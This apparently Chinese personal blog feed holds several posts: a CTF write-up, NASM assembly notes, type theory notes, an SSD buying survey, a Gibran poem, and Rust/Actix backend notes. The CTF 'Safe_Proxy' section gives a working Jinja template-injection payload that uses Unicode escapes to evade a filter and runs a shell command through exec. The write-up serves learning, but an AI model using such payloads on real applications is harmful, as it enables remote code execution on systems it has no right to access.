<h3 id="win1"><a href="#win1" class="headerlink" title="win1"></a>win1</h3><p>运行虚拟机查看属性</p>
<p>送分题</p>
<h3 id="win2"><a href="#win2" class="headerlink" title="win2"></a>win2</h3><p>翻日志的时候 查看了一下计划任务找到密码</p>
<p>很明显的base64编码</p>
<p>解码成html实体编码</p>
<p>就这</p>
<p>最后解码成flag</p>
<h3 id="Safe-Proxy"><a href="#Safe-Proxy" class="headerlink" title="Safe_Proxy"></a>Safe_Proxy</h3><p>阅读源码发现是我熟悉的flask 框架</p>
<p>过滤内容太多了</p>
<p>但是没有过滤	Unicode 转义</p>
<p>代码尝试通过递归访问字典的多个层级来最终获取到 <code>exec</code> 函数</p>
<p>最后exec执行命令即可</p>
<p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">code=&#123;&#123;cycler[<span class="string">&#x27;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&#x27;</span>][<span class="string">&#x27;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&#x27;</span>][<span class="string">&#x27;\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f&#x27;</span>][<span class="string">&#x27;exec&#x27;</span>](<span class="string">&quot;(\u005f\u005f\u0069\u006d\u0070\u006f\u0072\u0074\u005f\u005f)(&#x27;\u006f\u0073&#x27;).\u0070\u006f\u0070\u0065\u006e(&#x27;cat /flag &gt; app.py&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>ps:思路： 内建字典中获取到 <code>exec</code> 函数，利用该函数执行一个命令行操作</p>
]]></content>
      <tags>
        <tag>网络安全</tag>
        <tag>SQL</tag>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-1-9-NASM学习一</title>
    <url>/2025/01/09/2025-1-9-NASM%E5%AD%A6%E4%B9%A0%E4%B8%80/</url>
    <content><![CDATA[<h3 id="Nasm-1Day"><a href="#Nasm-1Day" class="headerlink" title="Nasm 1Day"></a>Nasm 1Day</h3><p>全部代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extern _printf,_system ;声明外部的 printf 函数</span><br><span class="line">section .data</span><br><span class="line">	cmd db &#x27;chcp 65001&#x27;,0 ; 设置终端的编码</span><br><span class="line">	msg db &#x27;Hello,World!&#x27;, 0;定义字符串常量</span><br><span class="line">	newline db 10,0</span><br><span class="line">	info_1 db &#x27;qwq,This is my first nasm code&#x27;,0</span><br><span class="line">	info_2 db &#x27;这下是中文输出&#x27;,0</span><br><span class="line">	test_1 db &#x27;mkdir 1&#x27;,0</span><br><span class="line"></span><br><span class="line">section .text</span><br><span class="line">	global _main ; 设置入口函数为 _main</span><br><span class="line"></span><br><span class="line">_main:</span><br><span class="line">	push test_1</span><br><span class="line">    call _system ; 调用系统参数执行命令</span><br><span class="line"></span><br><span class="line">	push msg ;将字符串地址推入栈中,作为参数传递给printf</span><br><span class="line">	call _printf ;调用prinf 函数</span><br><span class="line">	add esp,4 ;清理栈上的参数</span><br><span class="line">	push newline</span><br><span class="line">	call _printf</span><br><span class="line">	add esp,4 </span><br><span class="line">	push info_1</span><br><span class="line">	call _printf</span><br><span class="line">	add esp,4</span><br><span class="line"></span><br><span class="line">	push newline</span><br><span class="line">	call _printf</span><br><span class="line">	add esp,4</span><br><span class="line"></span><br><span class="line">	push info_2</span><br><span class="line">	call _printf</span><br><span class="line">	add esp,4</span><br><span class="line"></span><br><span class="line">	ret ;函数返回</span><br></pre></td></tr></table></figure>

<p>代码执行：</p>
<pre><code>- 打印 Hello,World! qwq,This is my first nasm code ... 等
- 执行了两个cmd命令 设置编码和创建了名为1的文件夹
</code></pre>
<p>代码分段分析</p>
<p>主要分为三个部分</p>
<h4 id="声明部分"><a href="#声明部分" class="headerlink" title="声明部分"></a>声明部分</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">extern _printf,_system ;声明外部的 printf 函数</span><br></pre></td></tr></table></figure>

<h4 id="定义部分"><a href="#定义部分" class="headerlink" title="定义部分"></a>定义部分</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">section .data</span><br><span class="line">	cmd db &#x27;chcp 65001&#x27;,0 ; 设置终端的编码</span><br><span class="line">	msg db &#x27;Hello,World!&#x27;, 0;定义字符串常量</span><br><span class="line">	newline db 10,0</span><br><span class="line">	info_1 db &#x27;qwq,This is my first nasm code&#x27;,0</span><br><span class="line">	info_2 db &#x27;这下是中文输出&#x27;,0</span><br><span class="line">	test_1 db &#x27;mkdir 1&#x27;,0</span><br><span class="line">section .text</span><br><span class="line">	global _main ; 设置入口函数为 _main</span><br></pre></td></tr></table></figure>

<h4 id="执行部分"><a href="#执行部分" class="headerlink" title="执行部分"></a>执行部分</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_main:</span><br><span class="line">	push test_1</span><br><span class="line">    call _system ; 调用系统参数执行命令</span><br><span class="line"></span><br><span class="line">	push msg ;将字符串地址推入栈中,作为参数传递给printf</span><br><span class="line">	call _printf ;调用prinf 函数</span><br><span class="line">	add esp,4 ;清理栈上的参数</span><br><span class="line">	push newline</span><br><span class="line">	call _printf</span><br><span class="line">	add esp,4 </span><br><span class="line">	push info_1</span><br><span class="line">	call _printf</span><br><span class="line">	add esp,4</span><br><span class="line"></span><br><span class="line">	push newline</span><br><span class="line">	call _printf</span><br><span class="line">	add esp,4</span><br><span class="line"></span><br><span class="line">	push info_2</span><br><span class="line">	call _printf</span><br><span class="line">	add esp,4</span><br><span class="line"></span><br><span class="line">	ret ;函数返回</span><br></pre></td></tr></table></figure>

<h3 id="关键字"><a href="#关键字" class="headerlink" title="关键字"></a>关键字</h3><h4 id="extern"><a href="#extern" class="headerlink" title="extern"></a>extern</h4><p>作用：</p>
<ul>
<li>用于声明外部符号</li>
<li>告诉汇编器某个符号在当前之外的文件定义</li>
</ul>
<h4 id="section"><a href="#section" class="headerlink" title="section"></a>section</h4><ul>
<li>用于指定代码或数据的段，告诉汇编器代码应该放在特定的段中</li>
<li>常见的段有 <ul>
<li><code>.text</code>（代码段）</li>
<li><code>.data</code>（数据段）</li>
<li><code>.bss</code>（未初始化数据段）</li>
</ul>
</li>
</ul>
<h4 id="push"><a href="#push" class="headerlink" title="push"></a>push</h4><ul>
<li>该指令将一个值压入栈中</li>
<li>会将操作数（寄存器、立即数、内存中的数据）压入栈并更新栈指针</li>
<li>常用于保存寄存器的值</li>
</ul>
<h4 id="call"><a href="#call" class="headerlink" title="call"></a>call</h4><ul>
<li>用于调用函数</li>
<li>call 将返回地址压入栈中，然后跳转到目标地址</li>
<li>也就是将函数调用后继续执行的地方放到函数的入口点</li>
</ul>
<h4 id="add"><a href="#add" class="headerlink" title="add"></a>add</h4><ul>
<li>将两个操作数相加 并将结果存储到第一个操作数中</li>
<li>支持将寄存器 立即数 以及内存地址作为操作数</li>
</ul>
<h4 id="ret"><a href="#ret" class="headerlink" title="ret"></a>ret</h4><ul>
<li>用于从函数返回</li>
<li>执行ret时 会从栈中弹出返回地址 将控制权传递给该地址处的代码（通常是函数调用的下一条指令）</li>
</ul>
<h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><h4 id="PE文件节"><a href="#PE文件节" class="headerlink" title="PE文件节"></a>PE文件节</h4><p>想了解什么是PE文件的 节 ，先要搞懂什么是PE文件</p>
<p>PE (Portable Executable)  译作：便携式可执行文件</p>
<p>用于</p>
<ul>
<li>可执行程序</li>
<li>动态链接库</li>
<li>系统驱动程序</li>
</ul>
<p>等文件格式</p>
<p>PE文件是Windows平台上执行程序的标准格式</p>
<p>基于COFF（Common Object File Format）格式</p>
<p>包含了不同的结构和信息来帮助操作系统 加载、执行、调试程序</p>
<p><strong>节</strong> 是PE文件内部的重要概念</p>
<p>指的是 文件中存储程序代码、数据、资源的区域</p>
<p>每个节都有特定的功能和属性 可以满足不同部分代码和数据的存储需求</p>
<h5 id="PE文件结构简述"><a href="#PE文件结构简述" class="headerlink" title="PE文件结构简述"></a>PE文件结构简述</h5><ol>
<li><p>DOS头：</p>
<ul>
<li>标记PE文件开始部分</li>
<li>包含魔数 <strong>MZ</strong></li>
<li>包含指向PE头部的指针</li>
</ul>
</li>
<li><p>PE头：</p>
<ul>
<li>PE文件的结构核心</li>
<li>包含文件格式关键信息<ul>
<li>机器平台</li>
<li>目标平台</li>
<li>节表位置</li>
</ul>
</li>
</ul>
</li>
<li><p>节表：</p>
<ul>
<li><p>记录文件中各个节</p>
<ul>
<li>位置</li>
<li>大小</li>
<li>属性</li>
</ul>
<ol start="4">
<li>节：</li>
</ol>
<ul>
<li>实际存储程序<ul>
<li>代码</li>
<li>数据</li>
<li>资源</li>
</ul>
</li>
<li>的区域</li>
</ul>
</li>
</ul>
</li>
</ol>
<h4 id="节的功能与属性"><a href="#节的功能与属性" class="headerlink" title="节的功能与属性"></a>节的功能与属性</h4><ul>
<li><p>代码节 <code>.text</code> ：包含程序的机器代码，通常 <strong>只读</strong> 且 <strong>可执行</strong></p>
</li>
<li><p>数据节 <code>.data</code> :   包含已初始化的全局变量和静态变量，通常 <strong>可读写</strong></p>
</li>
<li><p>未初始化数据节 <code>.bss</code>：包含未初始化的全局变量和静态变量，不占磁盘空间，加载时会被<strong>初始化为0</strong></p>
</li>
<li><p>只读数据节<code>.rdata1</code>：存放数据的只读数据，如字符串常量，这部分数据通常是<strong>共享</strong>的，不允许修改</p>
</li>
<li><p>导入&#x2F;导出节 <code>.idata</code>  和 <code>.edata</code>：用于动态链接 导入节存储程序所需的外部函数和符号，导出节用于存储程序希望其他程序调用的函数和符号（感觉像头文件）</p>
</li>
</ul>
]]></content>
      <tags>
        <tag>汇编</tag>
        <tag>nasm</tag>
      </tags>
  </entry>
  <entry>
    <title>2024-12-30-类型论</title>
    <url>/2024/12/30/2024-12-30-%E7%B1%BB%E5%9E%8B%E8%AE%BA/</url>
    <content><![CDATA[<h3 id="类型论初学"><a href="#类型论初学" class="headerlink" title="类型论初学"></a>类型论初学</h3><p>简述：类型论是一种形式理论，被视为编程语言中类型系统的数学表述。</p>
<p>特点：</p>
<pre><code>- 基于lambda 演算
- 使用规则定义类型
- 不需要穷举无穷大集合中的所有元素
- 命题也视为类型
</code></pre>
<p>函数类型对应内射态</p>
<p>积类型对应积</p>
<p>对应映射集 和 Descartes 积</p>
<p>类型论的范畴语义</p>
<p>模型：范畴 （范畴语义）</p>
<p>类型论为范畴的内语言</p>
<p>| <a href="https://www.bananaspace.org/wiki/%E9%9B%86%E5%90%88%E8%AE%BA">集合论</a> |                            类型论                            | <a href="https://www.bananaspace.org/wiki/%E8%8C%83%E7%95%B4%E8%AE%BA">范畴论</a> |      <a href="https://www.bananaspace.org/wiki/%E9%80%BB%E8%BE%91%E5%AD%A6">逻辑学</a>       |
| :———————————————–: | :———————————————————-: | :———————————————–: | :———————————————————-: |
|   <a href="https://www.bananaspace.org/wiki/%E9%9B%86%E5%90%88">集合</a>   |        <a href="https://www.bananaspace.org/wiki/%E7%B1%BB%E5%9E%8B">类型</a>         |   <a href="https://www.bananaspace.org/wiki/%E5%AF%B9%E8%B1%A1">对象</a>   |        <a href="https://www.bananaspace.org/wiki/%E5%91%BD%E9%A2%98">命题</a>         |
| <a href="https://www.bananaspace.org/wiki/%E5%8D%95%E7%82%B9%E9%9B%86">单点集</a> |    <a href="https://www.bananaspace.org/wiki/%E5%8D%95%E4%BD%8D%E7%B1%BB%E5%9E%8B">单位类型</a>     | <a href="https://www.bananaspace.org/wiki/%E7%BB%88%E5%AF%B9%E8%B1%A1">终对象</a> | <a href="https://www.bananaspace.org/w/index.php?title=%E6%B0%B8%E7%9C%9F%E5%91%BD%E9%A2%98&action=edit&redlink=1">永真命题</a> |
|   <a href="https://www.bananaspace.org/wiki/%E7%A9%BA%E9%9B%86">空集</a>   |      <a href="https://www.bananaspace.org/wiki/%E7%A9%BA%E7%B1%BB%E5%9E%8B">空类型</a>       | <a href="https://www.bananaspace.org/wiki/%E5%A7%8B%E5%AF%B9%E8%B1%A1">始对象</a> | <a href="https://www.bananaspace.org/w/index.php?title=%E6%B0%B8%E5%81%87%E5%91%BD%E9%A2%98&action=edit&redlink=1">永假命题</a> |
|   <a href="https://www.bananaspace.org/wiki/%E5%85%83%E7%B4%A0">元素</a>   | <a href="https://www.bananaspace.org/w/index.php?title=%E5%AE%9E%E4%BE%8B&action=edit&redlink=1">实例</a> |                从终对象出发的态射                 | <a href="https://www.bananaspace.org/w/index.php?title=%E8%AF%81%E6%98%8E&action=edit&redlink=1">证明</a> |</p>
<hr>
<p>举例类型论：简单类型λ演算 ( 记作 λ→ 或者  STλC)</p>
<h5 id="函数类型"><a href="#函数类型" class="headerlink" title="函数类型"></a>函数类型</h5><p>任何 λ→都是函数类型上扩充的</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">A,B::=V∣A→B</span><br><span class="line">M,N,u,v::= V∣(M N)∣(λV. M)</span><br></pre></td></tr></table></figure>

<p>其中：A,B 符号标识类型论中的类型</p>
<p>M，N，u，v这四个符号都表示类型论中的值(λ 表达式)</p>
<p>V标识变量或类型变量</p>
<p>符号u代表一个表达式的意思满足三个条件：</p>
<ul>
<li>u∈V</li>
<li>u形如 v1 v2 其中 v1 v2是类型u的表达式</li>
<li>u 形如 λx. v, 其中 x∈V, 而 v 是类似 u 的表达式.</li>
</ul>
<p>对 A,B 等表示类型的符号的描述也类似.</p>
]]></content>
      <tags>
        <tag>计算机科学</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-1-11-SSD浅入调研</title>
    <url>/2025/01/11/2025-1-11-SSD%E6%B5%85%E5%85%A5%E8%B0%83%E7%A0%94/</url>
    <content><![CDATA[<h4 id="因需要购买SSD而引发的一次调查研究"><a href="#因需要购买SSD而引发的一次调查研究" class="headerlink" title="因需要购买SSD而引发的一次调查研究"></a>因需要购买SSD而引发的一次调查研究</h4><p>由于我的笔记本硬盘空间严重不足，急需扩盘，借此机会我对笔记本硬盘市场进行了深入调研。</p>
<p>硬盘最核心的部件是什么？</p>
<p>当然是 NAND闪存单元 也就是俗称的 <strong>内存颗粒</strong></p>
<p>技术研究：</p>
<hr>
<p>​    第一代SLC（Single-Level Cell）每单元可存储1比特数据(1bit&#x2F;cell)，性能好、寿命长，可经受10万次编程&#x2F;擦写循环，但容量低、成本高，如今已经非常罕见；</p>
<p>​    第二代MLC（Multi-Level Cell）每单元可存储2比特数据(2bits&#x2F;cell)，性能、寿命、容量、成各方面比较均衡，可经受1万次编程&#x2F;擦写循环，现在只有在少数高端<a href="http://www.univo.com.cn/product_industrial-ssd.html">SSD</a>中可以见到；</p>
<p>​    第三代TLC（Trinary-Level Cell）每单元可存储3比特数据(3bits&#x2F;cell)，性能、寿命变差，只能经受3千次编程&#x2F;擦写循环，但是容量可以做得更大，成本也可以更低，是当前最普及的；</p>
<p>​    第四代QLC（Quad-Level Cell）每单元可存储4比特数据(4bits&#x2F;cell)，性能、寿命进一步变差，只能经受1000次编程&#x2F;擦写循环，但是容量更容易提升，成本也继续降低。</p>
<p>​    <a href="http://www.univo.com.cn/product_industrial-ssd.html">SSD</a><a href="http://www.univo.com.cn/product_industrial-ssd.html">固态硬盘</a>一直在追求更大的容量和更低的成本，而存储单元是 <a href="http://www.univo.com.cn/product_industrial-ssd.html">固态硬盘</a>的核心元件，选择SSD实际上就是在选择存储颗粒。所以会迫使Flash芯片厂商一直更新制程，以满足用户的需求。</p>
<p><em>引用自 — <a href="https://www.univo.com.cn/articles/agrade601.html">联乐实业技术白皮书</a></em></p>
<hr>
<p>实际使用情况是</p>
<p>高端，工业：</p>
<pre><code>- SLC
</code></pre>
<ul>
<li>MLC  工业，企业，数据无价，首选！</li>
</ul>
<p>普通用户：</p>
<pre><code>- TLC  消费级
- QLC 低端市场
</code></pre>
<p>那么根据这些，我选择TLC颗粒即可。</p>
<hr>
<p>下一步 对制造厂商的调研</p>
<p>硬盘厂商非常多，其中出名的品牌我进行简要统计：</p>
<p>公认大厂：</p>
<ul>
<li>国产：长江、长城、宏碁、yiright</li>
<li>美国：西部数据、英特尔、闪迪、金士顿、镁光、威刚、三星…</li>
<li>日本：东芝</li>
<li>韩国：三星</li>
</ul>
<p>….</p>
<p>​	这些品牌都有SSD出售，但经过调查我放弃了很大一部分</p>
<p>排除联想，联想旗下的正规硬盘制造品牌为 亿联，在和客服对话中得到信息联想牌固态硬盘甚至无法保证颗粒为TLC，只能说大部分是，我不敢想到底是为什么，难道是可能随机<strong>幸运用户</strong> 发货个QLC使用？</p>
<p>….</p>
<p>售后保障筛走一部分，例如：依正，做相机内存卡的为什么会来碰瓷SSD…</p>
<p>最后总结不碰代工的话就是 长江致态、三星、东芝，各有千秋</p>
<p>选择这些并不是因为最好，而是处于当前这个入门消费层级上选择，如果真的巨有米我会直接选购工业级的产品。</p>
<p>最后简单的说下就是注意卡槽长度和协议，这部分其实并不容易买错，因为区别太大了，例如我笔记本就是选择的 2280，NVMe. </p>
]]></content>
      <tags>
        <tag>硬件</tag>
        <tag>SSD</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-1-24-poem</title>
    <url>/2025/01/24/2025-1-24-poem/</url>
    <content><![CDATA[<h1 id="我曾七次鄙视自己的灵魂"><a href="#我曾七次鄙视自己的灵魂" class="headerlink" title="我曾七次鄙视自己的灵魂"></a>我曾七次鄙视自己的灵魂</h1><p>Seven times have I despised my soul
By Kahlil Gibran（卡里·纪伯伦）. </p>
<p>Seven times have I despised my soul.</p>
<ul>
<li>The first time when I saw her being meek that she might attain height .</li>
<li>The second time when I saw her limping before the crippled .</li>
<li>The third time when she was given to choose between the hard and the easy, and she chose the easy.</li>
<li>The fourth time when she committed a wrong, and comforted herself that others also commit wrong.</li>
<li>The fifth time when she forbore for weakness, and attributed her patience to strength.</li>
<li>The sixth time when she despised the ugliness of a face, and knew not that it was one of her own masks  </li>
<li>And the seventh time when she sang a song of praise, and deemed it a virtue.</li>
</ul>
]]></content>
      <tags>
        <tag>英语</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-2-9-审稿实现</title>
    <url>/2025/02/06/2025-2-9-%E5%AE%A1%E7%A8%BF%E9%A1%B9%E7%9B%AE/</url>
    <content><![CDATA[<h3 id="项目实现"><a href="#项目实现" class="headerlink" title="项目实现"></a>项目实现</h3><p>语言：<code>Rust</code></p>
<p>框架：<code>actix_web</code></p>
<p>依赖：</p>
<p>太多，后续补充</p>
<p>本文章未完成</p>
<hr>
<p>目前操作端 使用web形式实现 </p>
<p>第一步：管理员登录后获得审稿权限</p>
<p>第二步：审稿的实现</p>
<p>稿件数据格式：数据库中存的html </p>
<p>需求：预览稿件</p>
<ul>
<li>实现：将通过数据库返回的html渲染到前端准备好的容器内</li>
</ul>
<p>需求：拒绝稿件</p>
<ul>
<li>实现：将稿件移除到退稿区</li>
<li></li>
</ul>
<p>需求：允许稿件</p>
<ul>
<li>实现</li>
</ul>
<p>需求：删除稿件</p>
<ul>
<li>将已经发表的稿件送到退稿区</li>
</ul>
<hr>
<p>现在要做的，先，测试数据连接</p>
<hr>
<p>审稿页面</p>
<p>固定<code>css</code>样式，直接后端请求过来</p>
<p>通过<code>id</code>请求后端返回数据</p>
<p>后端则是通过id查询审稿的数据，将稿件的内容发送过来</p>
<p>（反正稿件本身存的就是html）</p>
<p>那么就是两个接口</p>
<p>一个是审稿页面的接口</p>
<p>另一个是关于稿件的接口</p>
]]></content>
      <tags>
        <tag>Nuxt.js</tag>
        <tag>Rust</tag>
        <tag>Actix</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-2-6-后端FAQ</title>
    <url>/2025/02/06/2025-2-6-%E6%80%9D%E8%B7%AF%E8%BD%AC%E6%8D%A2/</url>
    <content><![CDATA[<h1 id="FAQ-常见问题"><a href="#FAQ-常见问题" class="headerlink" title="FAQ[常见问题]"></a>FAQ[常见问题]</h1><h3 id="Middleware"><a href="#Middleware" class="headerlink" title="Middleware"></a>Middleware</h3><p>使用Rust开发 Actix 需要使用中间件</p>
<p>中间件处理有两个步骤。 
1.中间件初始化，中间件工厂被调用 
链中的下一个服务作为参数。 
中间件的调用方法通过正常请求被调用。</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> std::future::&#123;ready, Ready&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> actix_web::&#123;</span><br><span class="line">    dev::&#123;forward_ready, Service, ServiceRequest, ServiceResponse, Transform&#125;,</span><br><span class="line">    Error,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">use</span> futures_util::future::LocalBoxFuture;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 导入库</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">SayHi</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// SayHi 将作为一个中间件处理 ServiceRequest 类型的请求</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">impl</span>&lt;S, B&gt; Transform&lt;S, ServiceRequest&gt; <span class="keyword">for</span> <span class="title class_">SayHi</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// S - 下一个服务的类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// B - 响应体的类型</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 对 SayHi 结构体实现了 Transform trait</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Transform 是 actix-web 中的一个 trait，用来定义如何转换和处理请求</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">    S: Service&lt;ServiceRequest, Response = ServiceResponse&lt;B&gt;, Error = Error&gt;,</span><br><span class="line">    S::Future: <span class="symbol">&#x27;static</span>,</span><br><span class="line">    B: <span class="symbol">&#x27;static</span>,</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">type</span> <span class="title class_">Response</span> = ServiceResponse&lt;B&gt;;</span><br><span class="line">    <span class="keyword">type</span> <span class="title class_">Error</span> = Error;</span><br><span class="line">    <span class="keyword">type</span> <span class="title class_">InitError</span> = ();</span><br><span class="line">    <span class="keyword">type</span> <span class="title class_">Transform</span> = SayHiMiddleware&lt;S&gt;;</span><br><span class="line">    <span class="keyword">type</span> <span class="title class_">Future</span> = Ready&lt;<span class="type">Result</span>&lt;<span class="keyword">Self</span>::Transform, <span class="keyword">Self</span>::InitError&gt;&gt;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">fn</span> <span class="title function_">new_transform</span>(&amp;<span class="keyword">self</span>, service: S) <span class="punctuation">-&gt;</span> <span class="keyword">Self</span>::Future &#123;</span><br><span class="line">        <span class="title function_ invoke__">ready</span>(<span class="title function_ invoke__">Ok</span>(SayHiMiddleware &#123; service &#125;))</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里出现了一些比较高级的技巧</p>
<p><code>middleware factory</code> 中间件工厂</p>
<p>首先是 </p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">where</span></span><br><span class="line">    S: Service&lt;ServiceRequest, Response = ServiceResponse&lt;B&gt;, Error = Error&gt;,</span><br><span class="line">    S::Future: <span class="symbol">&#x27;static</span>,</span><br><span class="line">    B: <span class="symbol">&#x27;static</span>,</span><br></pre></td></tr></table></figure>

<p>这个 <code>where</code> 字句实现了类型约束：</p>
<p> <code>S</code> 必须是一个实现了 <code>Service</code> trait 的类型，且该服务处理的是 <code>ServiceRequest</code> 类型的请求，返回的是 <code>ServiceResponse&lt;B&gt;</code> 类型的响应，错误类型是 <code>Error</code>。</p>
<p>这是一个生命周期约束，表明 <code>S::Future</code> 的生命周期是 <code>&#39;static</code>，即返回的 <code>Future</code> 不会持有任何短生命周期的引用。</p>
<p>这是一个生命周期约束，表明响应体的类型 <code>B</code> 必须是 <code>&#39;static</code>，即 <code>B</code> 的生命周期是静态的，不依赖于任何局部变量或临时引用。</p>
<p>下面代码继续，定义了类型关联。（太高级了）</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> <span class="title class_">Response</span> = ServiceResponse&lt;B&gt;;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Error</span> = Error;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">InitError</span> = ();</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Transform</span> = SayHiMiddleware&lt;S&gt;;</span><br><span class="line"><span class="keyword">type</span> <span class="title class_">Future</span> = Ready&lt;<span class="type">Result</span>&lt;<span class="keyword">Self</span>::Transform, <span class="keyword">Self</span>::InitError&gt;&gt;;</span><br></pre></td></tr></table></figure>

<p>以上内容</p>
<p><code>Response</code> 类型指定了中间件工厂将会返回的响应类型</p>
<ul>
<li><code>ServiceResponse&lt;B&gt;</code>。它表示的是中间件最终生成的响应</li>
</ul>
<p><code>Error</code> 类型指定了服务中可能出现的错误类型：通用类型</p>
<p><code>InitError</code> 类型表示初始化中间件时可能发生的错误类型</p>
<ul>
<li>这里使用 <code>()</code> 作为初始化错误类型，表示初始化时没有错误</li>
</ul>
<p><code>Transform</code> 类型指定了中间件的类型</p>
<ul>
<li><code>SayHiMiddleware&lt;S&gt;</code>。即这个中间件会处理请求，类型参数 <code>S</code> 表示它会接收一个服务，并且是 <code>ServiceRequest</code> 类型的请求和 <code>ServiceResponse&lt;B&gt;</code> 类型的响应。</li>
</ul>
<p><code>Future</code> 类型表示中间件工厂的异步执行结果</p>
<ul>
<li><code>Ready</code>，意味着这个返回值是一个立即完成的 <code>Future</code>，它包装了一个 <code>Result&lt;Self::Transform, Self::InitError&gt;</code>。这表示中间件的创建过程是同步的，不会进行复杂的异步操作。</li>
</ul>
<p><code>new_transform</code> 方法是 <code>Transform</code> trait 的一部分，用于创建一个新的中间件实例</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">new_transform</span>(&amp;<span class="keyword">self</span>, service: S) <span class="punctuation">-&gt;</span> <span class="keyword">Self</span>::Future &#123;</span><br><span class="line">    <span class="title function_ invoke__">ready</span>(<span class="title function_ invoke__">Ok</span>(SayHiMiddleware &#123; service &#125;))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>new_transform</code> 方法是 <code>Transform</code> trait 的一部分，用于创建一个新的中间件实例。</p>
<p>参数解析：<code>S</code> 类型的 <code>service</code> 参数，这个 <code>service</code> 是下游的服务，即处理请求的实际服务。</p>
<p>返回类型解析：该方法返回一个 <code>Self::Future</code> 类型的 <code>Future</code>，即一个 <code>Ready</code> 类型的 <code>Future</code>，它表示异步操作完成并立即返回</p>
<p><strong><code>ready(Ok(SayHiMiddleware &#123; service &#125;))</code></strong></p>
<ul>
<li><code>ready</code> 是一个将结果包装成已完成的 <code>Future</code> 的辅助函数。在这里，我们返回了一个 <code>SayHiMiddleware&lt;S&gt;</code> 中间件，它包含了下游服务 <code>service</code>，并且包装在一个 <code>Ok</code> 结果中，表示没有错误。</li>
</ul>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">pub</span> <span class="keyword">struct</span> <span class="title class_">SayHiMiddleware</span>&lt;S&gt; &#123;</span><br><span class="line">    service: S,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong><code>SayHiMiddleware&lt;S&gt;</code></strong> 是一个结构体，接收 S 类型的参数。（S 为下游服务类型）</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">impl</span>&lt;S, B&gt; Service&lt;ServiceRequest&gt; <span class="keyword">for</span> <span class="title class_">SayHiMiddleware</span>&lt;S&gt;</span><br></pre></td></tr></table></figure>

<p>这是 <code>SayHiMiddleware&lt;S&gt;</code> 的 <code>Service&lt;ServiceRequest&gt;</code> trait 的实现。</p>
<p>定义了如何将请求传递给下游服务。具体来说，<code>Service</code> 是一个 trait，它定义了如何处理 <code>ServiceRequest</code>，并返回一个 <code>ServiceResponse&lt;B&gt;</code></p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">poll_ready</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>, cx: &amp;<span class="keyword">mut</span> Context&lt;<span class="symbol">&#x27;_</span>&gt;) <span class="punctuation">-&gt;</span> Poll&lt;<span class="type">Result</span>&lt;(), <span class="keyword">Self</span>::Error&gt;&gt; &#123;</span><br><span class="line">    <span class="keyword">self</span>.service.<span class="title function_ invoke__">poll_ready</span>(cx)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是 <code>Service&lt;ServiceRequest&gt;</code> trait 中的方法</p>
<p>作用是让中间件知道下游服务是否可以处理请求，用来检查服务是否准备好接收请求。</p>
<p>方法会调用下游服务 <code>self.service.poll_ready(cx)</code>，这表示如果下游服务准备好了（也就是说可以开始处理请求）</p>
<p>那么 <code>SayHiMiddleware</code> 也可以开始处理请求。</p>
<p>第二个方法</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="keyword">fn</span> <span class="title function_">call</span>(&amp;<span class="keyword">mut</span> <span class="keyword">self</span>, req: ServiceRequest) <span class="punctuation">-&gt;</span> <span class="keyword">Self</span>::Future &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">&quot;Hi! Handling a request!&quot;</span>);</span><br><span class="line">    <span class="keyword">self</span>.service.<span class="title function_ invoke__">call</span>(req)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong><code>call</code></strong> 是处理请求的核心方法，它会将一个 <code>ServiceRequest</code> 请求交给中间件来处理</p>
